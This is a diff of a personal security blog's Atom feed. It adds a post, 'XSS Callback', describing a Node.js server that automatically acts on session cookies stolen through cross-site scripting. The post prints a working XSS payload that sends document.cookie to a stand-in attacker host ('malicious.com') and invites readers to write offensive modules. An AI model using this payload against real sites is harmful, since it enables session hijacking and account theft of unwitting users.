@@ -4,7 +4,7 @@
   <title><![CDATA[My portfolio]]></title>
   <link href="http://paulsec.github.io/atom.xml" rel="self"/>
   <link href="http://paulsec.github.io/"/>
-  <updated>2014-03-10T18:37:09+01:00</updated>
+  <updated>2014-03-20T18:14:43+01:00</updated>
   <id>http://paulsec.github.io/</id>
   <author>
     <name><![CDATA[Paul A. (PaulSec)]]></name>
@@ -12,6 +12,67 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[XSS Callback]]></title>
+    <link href="http://paulsec.github.io/blog/2014/03/20/xss-callback/"/>
+    <updated>2014-03-20T17:50:34+01:00</updated>
+    <id>http://paulsec.github.io/blog/2014/03/20/xss-callback</id>
+    <content type="html"><![CDATA[<p>This post deals with a project I developed : <a href="https://github.com/PaulSec/XSS-Callback/">XSS Callback</a>.</p>
+
+<p>This is not going to be (at least, I hope) a boring post about XSS exploitation. No.</p>
+
+<p>Well, one scenario of using XSS would be to steal victim&rsquo;s cookie and access the page through his session.
+This technique is called <strong>Session Hijacking</strong>. Ok fair enough.</p>
+
+<p>However, some issues are present using this technique, let&rsquo;s take an example :</p>
+
+<ul>
+<li>You target a website</li>
+<li>Unfortunately, it&rsquo;s too late (or too early depending on your situation) and you go to sleep.</li>
+<li>You wake up in the night and there are loads of victims&rsquo;s sessions. Great !</li>
+</ul>
+
+
+<p>The only problem : the user <em>might have logged out of the platform</em> <strong>or</strong> there might be a <em>timeout on the session</em>.</p>
+
+<p><strong>What would you do next ? </strong>
+Well.. nothing much. You got lot of data but they are useless now.</p>
+
+<p>I had the idea to create a basic HTTP Server using <em>Node.js</em> that will trigger a procedure when it will be called.
+When launching this server, a route has been created which has this format :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">http</span><span class="o">:</span><span class="c1">//malicious.com/cookie/&lt;my-cookie&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok.. I guess you got it.</p>
+
+<p>You can now insert some malicious payload like this :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://malicious.com/cookie/&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The cookie will be inserted in the URL and loaded on the client-side.
+This means that you can go to sleep without any fear : All the victims who will load this URL will trigger an event on the server.
+The server will then execute the code you developed on the server-side (and log user cookies if you want to).</p>
+
+<p>Moreover, the idea of this code is completely generic that you can adapt for all web applications and the only thing you now have to do is : <strong>write your own</strong> <em>offensive</em> module.
+You&rsquo;ll be able to launch the Node.js server with your own module using this command :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">node</span> <span class="nx">server</span><span class="p">.</span><span class="nx">js</span> <span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">my</span><span class="o">/</span><span class="nx">module</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using the strenght of Node.js and the amount of modules, you can manage to create any attack you want to perform really easily.</p>
+
+<p>So.. hope you liked it and see you next time :&ndash;)</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Dealing with HTML Submit's conflict]]></title>
